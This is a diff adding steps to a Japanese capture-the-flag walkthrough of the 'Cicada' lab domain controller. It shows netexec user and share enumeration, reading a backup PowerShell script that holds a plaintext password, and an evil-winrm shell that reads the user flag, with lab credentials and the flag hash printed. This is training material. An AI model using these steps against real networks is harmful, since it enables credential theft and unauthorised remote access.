@@ -167,10 +167,10 @@ LDAP        10.129.231.149  389    CICADA-DC        Emily Oscars
 ## STEP 3
 ユーザ列挙すると、descriptionにdavid.oreliousのパスワードを確認
 ```sh
-└─$ netexec smb 10.129.231.149 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users                                                                                                
+└─$ netexec smb 10.129.231.149 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
 SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
 SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
-SMB         10.129.231.149  445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.231.149  445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-
 SMB         10.129.231.149  445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain 
 SMB         10.129.231.149  445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain 
 SMB         10.129.231.149  445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account 
@@ -190,3 +190,66 @@ SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.oreliou
 
 
 ## STEP 4
+devがreadできるようになった
+```sh
+└─$ netexec smb 10.129.231.149 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
+SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
+SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
+SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
+SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
+SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
+SMB         10.129.231.149  445    CICADA-DC        DEV             READ            
+SMB         10.129.231.149  445    CICADA-DC        HR              READ            
+SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share 
+SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share
+```
+dev内にpowershellスクリプトを確認
+```sh
+└─$ smbclient -U 'cicada.htb/david.orelious%aRt$Lp#7t*VQ!3' //10.129.231.149/DEV 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Thu Mar 14 08:31:39 2024
+  ..                                  D        0  Thu Mar 14 08:21:29 2024
+  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024
+
+                4168447 blocks of size 4096. 466566 blocks available
+```
+emily.oscarsのクレデンシャルを平文で確認
+```sh
+└─$ smbget -U 'cicada.htb/david.orelious%aRt$Lp#7t*VQ!3' smb://10.129.231.149/DEV/Backup_script.ps1
+Using domain: CICADA.HTB, user: david.orelious
+smb://10.129.231.149/DEV/Backup_script.ps1                                                                                                                                                                                                  
+Downloaded 601b in 6 seconds
+                
+└─$ cat Backup_script.ps1                                          
+
+$sourceDirectory = "C:\smb"
+$destinationDirectory = "D:\Backup"
+
+$username = "emily.oscars"
+$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
+$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$backupFileName = "smb_backup_$dateStamp.zip"
+$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
+Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
+Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
+```
+step2でemily.oscarsはwinrmログイン可能と確認  
+winrmログイン成功、ユーザフラグゲット
+```sh
+└─$ evil-winrm -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cat ../desktop/user.txt
+579f573c819fbd3f6f8e35448f29d77c
+```
